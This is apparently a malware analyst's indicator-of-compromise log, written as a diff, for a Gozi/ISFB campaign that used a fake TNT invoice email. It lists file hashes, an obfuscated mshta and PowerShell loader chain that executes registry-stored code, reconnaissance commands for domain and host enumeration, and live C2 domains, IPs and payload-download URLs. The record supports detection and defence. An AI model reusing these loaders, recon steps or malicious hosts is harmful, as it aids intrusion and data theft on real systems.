@@ -1,0 +1,147 @@
+28.04.2022 | Gozi_ifsb | 3000 | base_path /drew/ | build 250229
+
+******************************
+
+Sender: uf_finemese@TNTITALY.IT
+Subject: Fattura Nazionale TNT 82986268 27/04/22 - Cod. Cliente 04808227
+
+******************************
+
+.xls 9d2c95265df8e4891ee37542e84b406fa9bfcb4386c6ea025b00d686092798ff
+.dll 4216810c4c1d5c0ef229668e1b7180a02610369674a2b9af93fbc9854eaccfa7
+.dll 0f7c69f83cd47009aa4b0b7e99cf0c9f23567a0e1862aa9bc83e4e684e72ff5b
+
+******************************
+
+Exec >>
+
+C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\FM188257_86771972.xlsm
+
+regsvr32 -s C:\Users\Admin\AppData\Local\Temp\4137.
+
+C:\Users\Admin\AppData\Local\Temp\4137.dll
+
+mshta.exe" "about:<hta:application><script>Shvw='wscript.shell';resizeTo(0,2);eval(new ActiveXObject(Shvw).regread('HKCU\\\Software\\AppDataLow\\Software\\Microsoft\\10AAFBA1-2FF6-C22D-3944-D3167DB8B7AA\\\ManagerPack'));if(!window.flag)close()</script>"
+
+powershell.exe" new-alias -name iudytgtsi -value gp; new-alias -name emjtkocwh -value iex; emjtkocwh ([System.Text.Encoding]::ASCII.GetString((iudytgtsi "HKCU:Software\AppDataLow\Software\Microsoft\10AAFBA1-2FF6-C22D-3944-D3167DB8B7AA").GameStop))
+
+csc.exe" /noconfig /fullpaths @"C:\Users\Admin\AppData\Local\Temp\3zavmsf5\3zavmsf5.cmdline"
+
+cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\Admin\AppData\Local\Temp\RES6C47.tmp" "c:\Users\Admin\AppData\Local\Temp\3zavmsf5\CSC609A9842AEF641EBB03772A1F53530B5.TMP"
+
+csc.exe" /noconfig /fullpaths @"C:\Users\Admin\AppData\Local\Temp\gihpniq3\gihpniq3.cmdline"
+
+cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\Admin\AppData\Local\Temp\RES6D31.tmp" "c:\Users\Admin\AppData\Local\Temp\gihpniq3\CSC871D1CCF12DE4DBE90BAC4A46C7E8993.TMP"
+
+cmd.exe" /C ping localhost -n 5 && del "C:\Users\Admin\AppData\Local\Temp\9c2ba02350538f6a4392c85f44550949.dll"
+
+ping  localhost -n 5 
+
+cmd /C "nslookup myip.opendns.com resolver1.opendns.com > C:\Users\Admin\AppData\Local\Temp\AA31.bi1"
+
+nslookup  myip.opendns.com resolver1.opendns.com 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\AA31.bi1"
+
+cmd /C "systeminfo.exe > C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+systeminfo.exe  
+
+cmd.exe" /C pause dll mail, , 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+cmd /C "net view >> C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+net  view 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+cmd /C "nslookup 127.0.0.1 >> C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+nslookup  127.0.0.1 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+cmd /C "tasklist.exe /SVC >> C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+tasklist.exe  /SVC 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+cmd /C "driverquery.exe >> C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+driverquery.exe  
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+cmd /C "reg.exe query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s >> C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+reg.exe  query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+cmd /C "net config workstation >> C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+net  config workstation 
+
+C:\Windows\system32\net1  config workstation 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+cmd /C "nltest /domain_trusts >> C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+nltest  /domain_trusts 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+cmd /C "nltest /domain_trusts /all_trusts >> C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+nltest  /domain_trusts /all_trusts 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+cmd /C "net view /all /domain >> C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+net  view /all /domain 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+cmd /C "net view /all >> C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+net  view /all 
+
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+cmd /U /C "type C:\Users\Admin\AppData\Local\Temp\1827.bin1 > C:\Users\Admin\AppData\Local\Temp\1827.bin & del C:\Users\Admin\AppData\Local\Temp\1827.bin1"
+
+C:\Windows\System32\RuntimeBroker.exe -Embedding
+
+*************************************************
+
+https://tria.ge/220428-kgetfsbeh8
+
+*************************************************
+
+.dll drop
+
+https://inversinbiz.com
+
+c2's
+
+cabrioxmdes.at
+hopexmder.net
+94.140.114.144
+94.140.112.49
+94.140.112.121
+
+Additonal Network Traffic:
+
+http://193.56.146.133/stilak32.rar
+http://193.56.146.133/stilak64.rar
+http://193.56.146.133/cook32.rar
+http://193.56.146.133/cook64.rar
+
+http://94.140.115.8/drew/adF8XoHSy3nFUr/aaKIiP3acPQ1Yer9cLWje/MA933uggFjuncV7I/srWxbzQH28wyF6p/ZpCVeBt0nagqTkrSuM/LotzzGnvd/YHLiJ_2BMdoUKROHZJrq/eEj5rpD_2BZH_2FKXNr/Z7lcS3LC74FrynGVhOQlBT/alcO7zje5TUoJ/YBIzF8g3/HM_2FXu2LZS0UmMtYMD_2Bl/Heh1mdbRnQ/bvTfNaNTpf6kaotge/HLAoiEJ_2BdA/ie2exlzfAGn/afTQwviCUG6wXH_2F7/rfRD.jlk
+
+http://cabrioxmdes.at/images//images/4qQIjJun04/ZORYHH_2F_2FH4myi/HS4BCw_2BqwN/_2Fiiy7OFp_/2FpeVkglMNp4V4/JfaODS2_2FyedoXNP8q_2/BREhlicb1C9r6I5t/fZRXPU0_2BX1xCS/tQ_2FrS_2FkCYq8ewO/U_2Bg_2B7/xwg_2B1jGAMJR6d_2FiN/jFphvk6aWjzRuhG9Fes/e9C_2B02GMD7p3EaA_2BI8/IMKiOJ6NNrr_2/BYghEXVb/kCdwY0zcgDbgq3dvgl6OxmD/p4ZGZZJYUg/CwjbQyJqPCO8_2Fa_/2B2X27aLk1LCh/LYctKA.bmp
